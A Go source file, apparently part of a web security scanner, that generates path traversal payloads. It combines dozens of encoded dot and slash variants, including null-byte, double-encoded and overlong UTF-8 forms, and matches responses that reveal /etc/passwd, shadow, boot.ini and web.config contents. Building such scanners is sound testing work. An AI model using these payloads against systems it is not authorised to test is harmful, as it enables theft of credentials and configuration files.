package brokenauthorization

import "strings"

// Dots encodings combined with slash encodings to form traversal patterns.
var dots = []string{
	"..",
	".%00.",
	"..%00",
	"..%01",
	".?", "??", "?.",
	"%5C..",
	".%2e", "%2e.",
	".../.",
	"..../",
	"%2e%2e", "%%c0%6e%c0%6e",
	"0x2e0x2e", "%c0.%c0.",
	"%252e%252e",
	"%c0%2e%c0%2e", "%c0%ae%c0%ae",
	"%c0%5e%c0%5e", "%c0%ee%c0%ee",
	"%c0%fe%c0%fe", "%uff0e%uff0e",
	"%%32%%65%%32%%65",
	"%e0%80%ae%e0%80%ae",
	"%25c0%25ae%25c0%25ae",
	"%f0%80%80%ae%f0%80%80%ae",
	"%f8%80%80%80%ae%f8%80%80%80%ae",
	"%fc%80%80%80%80%ae%fc%80%80%80%80%ae",
}

var slashes = []string{
	"/", "\\",
	"%2f", "%5c",
	"0x2f", "0x5c",
	"%252f", "%255c",
	"%c0%2f", "%c0%af", "%c0%5c", "%c1%9c", "%c1%pc",
	"%c0%9v", "%c0%qf", "%c1%8s", "%c1%1c", "%c1%af",
	"%bg%qf", "%u2215", "%u2216", "%uEFC8", "%uF025",
	"%%32%%66", "%%35%%63",
	"%e0%80%af",
	"%25c1%259c", "%25c0%25af",
	"%f0%80%80%af",
	"%f8%80%80%80%af",
}

var specialPatterns = []string{
	"..//", "..///", "..\\\\", "..\\\\\\", "../\\", "..\\/",
	"../\\/", "..\\/\\", "\\../", "/..\\", ".../", "...\\",
	"./../", ".\\..\\", ".//..//", ".\\\\..\\\\", "......///",
	"%2e%c0%ae%5c", "%2e%c0%ae%2f",
}

var specialPrefixes = []string{"///", "\\\\\\", `\.`, "../../foo/", `C:\`}
var specialMidPatterns = []string{"../", "..\\"}
var specialSuffixes = []string{"%00", "?", " ", "%00index.html", "%00index.htm", ";index.html", ";index.htm"}
var specialSlashEncodings = []string{"//", "///", "\\\\", "\\\\\\", "/\\", "\\/", "/\\/", "\\/\\"}

// GenerateTraversals builds traversal strings for dstPath at the given depth.
// depth must be >= 1.
func GenerateTraversals(dstPath string, depth int) []string {
	if depth < 1 {
		depth = 1
	}
	dstPath = strings.TrimSpace(dstPath)
	fname := stripLeadingSeparator(dstPath)

	var patterns []string
	for _, d := range dots {
		for _, s := range slashes {
			patterns = append(patterns, d+s)
		}
	}

	var stringsOut []string
	for _, p := range patterns {
		for k := 1; k <= depth; k++ {
			stringsOut = append(stringsOut, strings.Repeat(p, k))
		}
	}
	for _, sp := range specialPatterns {
		for k := 1; k <= depth; k++ {
			stringsOut = append(stringsOut, strings.Repeat(sp, k))
		}
	}
	for _, prefix := range specialPrefixes {
		for _, mid := range specialMidPatterns {
			for k := 1; k <= depth; k++ {
				stringsOut = append(stringsOut, prefix+strings.Repeat(mid, k))
			}
		}
	}

	var traversals []string
	seen := make(map[string]bool)
	add := func(s string) {
		if s == "" || seen[s] {
			return
		}
		seen[s] = true
		traversals = append(traversals, s)
	}

	for _, trav := range stringsOut {
		encoded := encodeFilenameSeparators(fname, trav)
		add(trav + encoded)
	}

	// Special mid + suffix combinations.
	for _, mid := range specialMidPatterns {
		for k := 1; k <= depth; k++ {
			base := strings.Repeat(mid, k) + encodeFilenameSeparators(fname, mid)
			for _, suf := range specialSuffixes {
				add(base + suf)
			}
		}
	}

	return traversals
}

func stripLeadingSeparator(filename string) string {
	if filename == "" {
		return filename
	}
	if filename[0] == '/' || filename[0] == '\\' {
		return filename[1:]
	}
	return filename
}

// encodeFilenameSeparators rewrites / and \ in the target path to match the
// separator style used by the current traversal string.
func encodeFilenameSeparators(fname, trav string) string {
	if !strings.ContainsAny(fname, "/\\") {
		return fname
	}

	all := append(append([]string{}, slashes...), specialSlashEncodings...)
	for i := len(all) - 1; i >= 0; i-- {
		enc := all[i]
		if enc == "" {
			continue
		}
		if !strings.Contains(trav, enc) {
			continue
		}
		out := fname
		if strings.Contains(out, "/") {
			out = strings.ReplaceAll(out, "/", enc)
		} else if strings.Contains(out, "\\") {
			out = strings.ReplaceAll(out, "\\", enc)
		}
		return out
	}
	return fname
}

// PatternForDestination returns a response match pattern for common sensitive files.
func PatternForDestination(dstPath string) string {
	lower := strings.ToLower(dstPath)
	switch {
	case strings.Contains(lower, "passwd"), strings.Contains(lower, "shadow"):
		return "root:"
	case strings.Contains(lower, "boot.ini"):
		return "[boot loader]"
	case strings.Contains(lower, "win.ini"):
		return "[fonts]"
	case strings.Contains(lower, "hosts"):
		return "localhost"
	case strings.Contains(lower, "web.config"):
		return "<configuration"
	case strings.Contains(lower, "httpd.conf"), strings.Contains(lower, "apache"):
		return "ServerRoot"
	default:
		return ""
	}
}
